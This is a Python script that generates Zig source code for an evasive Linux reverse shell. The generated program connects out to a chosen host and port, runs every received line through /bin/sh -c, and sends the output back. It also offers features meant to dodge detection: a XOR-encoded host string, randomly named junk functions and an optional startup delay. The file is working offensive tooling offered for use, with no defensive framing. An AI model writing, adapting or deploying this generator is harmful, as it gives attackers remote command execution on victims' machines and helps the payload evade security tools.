#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate evasive pure-Zig Linux reverse shell source."""

from __future__ import annotations

import random
import string


def _junk_var_name() -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))


def build_zig_linux_shell_source(
    *,
    lhost: str,
    lport: int,
    sleep_ms: int = 0,
    obfuscate_host: bool = False,
) -> str:
    host = str(lhost).replace("\\", "\\\\").replace('"', '\\"')
    port = int(lport)
    sleep_block = ""
    if sleep_ms > 0:
        sleep_block = f"""
    std.posix.nanosleep(
        @divTrunc(@as(u64, {sleep_ms}), 1000),
        @as(u64, @rem(@as(u64, {sleep_ms}), 1000)) * std.time.ns_per_ms,
    );
"""

    host_setup = f'const HOST = "{host}";'
    connect_line = "    const sock = try connectHost(allocator, HOST, PORT);"
    if obfuscate_host:
        encoded = [ord(c) ^ 0x5A for c in host]
        arr = ", ".join(str(b) for b in encoded)
        var = _junk_var_name()
        host_setup = f"""
const {var}: [{len(encoded)}]u8 = .{{{arr}}};
fn decodeHost(allocator: std.mem.Allocator) ![]u8 {{
    var out = try allocator.alloc(u8, {var}.len);
    for ({var}, 0..) |b, i| out[i] = b ^ 0x5A;
    return out;
}}
"""
        connect_line = """    const host = try decodeHost(allocator);
    defer allocator.free(host);
    const sock = try connectHost(allocator, host, PORT);"""

    junk = _junk_var_name()

    return f"""const std = @import("std");
const posix = std.posix;
const process = std.process;
const mem = std.mem;

{host_setup}
const PORT: u16 = {port};

fn {junk}(n: u64) u64 {{
    var x: u64 = n ^ 0xCAFEBABE;
    var i: u32 = 0;
    while (i < 32) : (i += 1) x = x *% 6364136223846793005 +% 1;
    return x;
}}

fn connectHost(allocator: std.mem.Allocator, host: []const u8, port: u16) !posix.socket_t {{
    _ = {junk}(@intFromPtr(host.ptr));
    const sock = try posix.socket(posix.AF.INET, posix.SOCK.STREAM | posix.SOCK.CLOEXEC, 0);
    errdefer posix.close(sock);

    var addr: posix.sockaddr.in = undefined;
    addr.family = posix.AF.INET;
    addr.port = std.mem.nativeToBig(u16, port);

    var ip_parts: [4]u8 = undefined;
    var part_idx: usize = 0;
    var current: u32 = 0;
    for (host) |c| {{
        if (c == '.') {{
            if (part_idx >= 4) return error.BadHost;
            ip_parts[part_idx] = @intCast(current);
            part_idx += 1;
            current = 0;
        }} else if (c >= '0' and c <= '9') {{
            current = current * 10 + (c - '0');
        }} else return error.BadHost;
    }}
    if (part_idx != 3) return error.BadHost;
    ip_parts[3] = @intCast(current);
    const ip_addr: u32 = (@as(u32, ip_parts[0]) << 24) |
        (@as(u32, ip_parts[1]) << 16) |
        (@as(u32, ip_parts[2]) << 8) |
        @as(u32, ip_parts[3]);
    addr.addr = std.mem.nativeToBig(u32, ip_addr);

    try posix.connect(sock, @ptrCast(&addr), @sizeOf(posix.sockaddr.in));
    _ = allocator;
    return sock;
}}

fn sendAll(sock: posix.socket_t, data: []const u8) !void {{
    var sent: usize = 0;
    while (sent < data.len) {{
        const n = try posix.send(sock, data[sent..], 0);
        sent += n;
    }}
}}

fn recvLine(allocator: std.mem.Allocator, sock: posix.socket_t, max_len: usize) ![]u8 {{
    var list = std.ArrayList(u8).empty;
    var buf: [1]u8 = undefined;
    while (list.items.len < max_len) {{
        const n = try posix.recv(sock, &buf, 0);
        if (n == 0) return error.Closed;
        if (buf[0] == '\\n') break;
        if (buf[0] != '\\r') try list.append(allocator, buf[0]);
    }}
    return try list.toOwnedSlice(allocator);
}}

fn execCmd(allocator: std.mem.Allocator, cmd: []const u8, cwd: ?[]const u8) ![]u8 {{
    const trimmed = mem.trim(u8, cmd, " \\r\\n");
    if (trimmed.len == 0) return allocator.dupe(u8, "");
    var args = std.ArrayList([]const u8).empty;
    defer args.deinit(allocator);
    try args.append(allocator, "/bin/sh");
    try args.append(allocator, "-c");
    try args.append(allocator, trimmed);
    var child = process.Child.init(args.items, allocator);
    child.cwd = cwd;
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    child.spawn() catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    var out = std.ArrayList(u8).empty;
    defer out.deinit(allocator);
    var err_out = std.ArrayList(u8).empty;
    defer err_out.deinit(allocator);
    child.collectOutput(allocator, &out, &err_out, 1024 * 1024) catch |e| {{
        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
    }};
    _ = child.wait() catch {{}};
    if (err_out.items.len == 0) return allocator.dupe(u8, out.items);
    var combined = std.ArrayList(u8).empty;
    try combined.appendSlice(allocator, out.items);
    try combined.appendSlice(allocator, err_out.items);
    return try combined.toOwnedSlice(allocator);
}}

pub fn main() !void {{
    var gpa = std.heap.GeneralPurposeAllocator(.{{.safety = false}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
{sleep_block}
    const cwd = process.getCwdAlloc(allocator) catch null;
    defer if (cwd) |c| allocator.free(c);
{connect_line}
    defer posix.close(sock);

    while (true) {{
        const cmd = recvLine(allocator, sock, 8192) catch break;
        defer allocator.free(cmd);
        const out = execCmd(allocator, cmd, cwd) catch |e| {{
            const msg = std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}}) catch break;
            defer allocator.free(msg);
            sendAll(sock, msg) catch break;
            continue;
        }};
        defer allocator.free(out);
        sendAll(sock, out) catch break;
    }}
}}
"""
